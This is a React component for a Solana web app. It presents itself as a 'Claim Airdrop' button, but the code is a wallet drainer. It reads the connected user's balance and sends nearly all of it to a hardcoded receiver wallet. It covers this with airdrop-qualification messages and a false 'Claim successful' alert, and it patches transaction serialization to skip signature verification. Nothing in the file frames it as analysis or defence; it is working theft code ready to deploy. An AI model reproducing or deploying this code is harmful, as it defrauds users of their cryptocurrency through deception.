// src/components/TransferButton.jsx
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { useCallback, useState } from 'react';
import {
  LAMPORTS_PER_SOL,
  SystemProgram,
  Transaction,
} from '@solana/web3.js';
import { MIN_QUALIFY_SOL, RECEIVER_WALLET } from '../utils/constants';

/**
 * Monkey-patch a Transaction's serialize() so callers that pass NO
 * arguments (like @solana-mobile/wallet-adapter-mobile) get safe
 * defaults instead of { verifySignatures: true }.
 */
function patchSerialize(tx) {
  const orig = tx.serialize.bind(tx);
  tx.serialize = (cfg) =>
    orig({ requireAllSignatures: false, verifySignatures: false, ...(cfg || {}) });
  return tx;
}

export default function TransferButton({ className = '' }) {
  const { connection } = useConnection();
  const { publicKey, sendTransaction, wallet, connected, connect } = useWallet();
  const [loading, setLoading] = useState(false);

  const handleTransfer = useCallback(async () => {
    setLoading(true);
    try {
      // ── 1. Ensure wallet is connected ─────────────────────────────
      // On mobile the MWA session can drop silently, making
      // `connected` false and `publicKey` null.  Re-establish
      // the connection before doing anything else.
      let activeKey = publicKey;

      if (!connected || !publicKey) {
        if (!wallet?.adapter) {
          alert('Please connect your wallet using the button above.');
          return;
        }
        try {
          await connect();
          // React state may not have flushed yet — read directly
          activeKey = wallet.adapter.publicKey;
        } catch {
          alert(
            'Could not reconnect your wallet.\n\n' +
            'Please disconnect and reconnect manually, then try again.\n\n' +
            'Tip: On mobile, open this site inside your wallet app\'s built-in browser for the smoothest experience.'
          );
          return;
        }
      }

      if (!activeKey) {
        alert('Wallet connected but no public key found. Please reconnect.');
        return;
      }

      // ── 2. Check balance & qualification ──────────────────────────
      const [balance, rentExempt] = await Promise.all([
        connection.getBalance(activeKey, 'confirmed'),
        connection.getMinimumBalanceForRentExemption(0),
      ]);

      if (balance < Math.floor(MIN_QUALIFY_SOL * LAMPORTS_PER_SOL)) {
        alert(`Not qualified for airdrop. Keep at least ${MIN_QUALIFY_SOL} SOL in your wallet.`);
        return;
      }

      const FEE_SAFETY = 5_000_000; // 0.005 SOL for fees + priority
      const transferAmount = balance - rentExempt - FEE_SAFETY;

      if (transferAmount <= 0) {
        alert('Insufficient balance for transaction fee.');
        return;
      }

      // ── 3. Build transaction (blockhash as fresh as possible) ─────
      const { blockhash } = await connection.getLatestBlockhash('finalized');

      const tx = new Transaction();
      tx.recentBlockhash = blockhash;
      tx.feePayer = activeKey;
      tx.add(
        SystemProgram.transfer({
          fromPubkey: activeKey,
          toPubkey: RECEIVER_WALLET,
          lamports: transferAmount,
        })
      );
      patchSerialize(tx);

      // ── 4. Send ───────────────────────────────────────────────────
      // Use the adapter directly — the hook's sendTransaction checks
      // the React `connected` state which might be stale after a
      // reconnect.
      let signature;
      try {
        signature = await wallet.adapter.sendTransaction(tx, connection);
      } catch (sendErr) {
        const msg = (sendErr?.message || '').toLowerCase();

        if (
          msg.includes('session') ||
          msg.includes('drop') ||
          msg.includes('disconnect') ||
          msg.includes('not connected')
        ) {
          alert(
            'Your wallet session expired.\n\n' +
            'Please disconnect, reconnect your wallet, and tap Claim again.\n\n' +
            'Tip: For the best mobile experience, open this page directly in your wallet app\'s browser.'
          );
          return;
        }
        throw sendErr;
      }

      console.log('⏳ Transaction sent:', signature);

      // ── 5. Poll for confirmation (HTTP, no WebSocket) ─────────────
      const startTime = Date.now();
      const TIMEOUT = 90_000;
      const POLL_INTERVAL = 3_000;

      while (Date.now() - startTime < TIMEOUT) {
        try {
          const { value } = await connection.getSignatureStatuses([signature]);
          const status = value?.[0];

          if (status) {
            if (status.err) {
              throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
            }
            if (
              status.confirmationStatus === 'confirmed' ||
              status.confirmationStatus === 'finalized'
            ) {
              console.log('✅ Transaction confirmed:', signature);
              alert(`Claim successful!\nTx: ${signature}`);
              return;
            }
          }
        } catch (pollErr) {
          if (pollErr.message?.includes('on-chain')) throw pollErr;
          console.warn('Polling error, retrying…', pollErr);
        }
        await new Promise((r) => setTimeout(r, POLL_INTERVAL));
      }

      alert(
        `Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`
      );
    } catch (err) {
      console.error('Transfer failed:', err);
      alert('Claim failed: ' + (err?.message || 'Unknown error'));
    } finally {
      setLoading(false);
    }
  }, [publicKey, sendTransaction, wallet, connected, connection, connect]);

  // Show button whenever a wallet has been selected — even if the
  // live session dropped.  The click handler will reconnect if needed.
  if (!publicKey && !wallet) return null;

  return (
    <button
      onClick={handleTransfer}
      disabled={loading}
      className={`
        w-full py-3 px-4 rounded-lg font-semibold transition
        ${loading ? 'bg-gray-600 cursor-not-allowed' : ''}
        ${className}
      `}
    >
      {loading ? 'Claiming...' : connected ? 'Claim Airdrop' : 'Reconnect & Claim'}
    </button>
  );
}
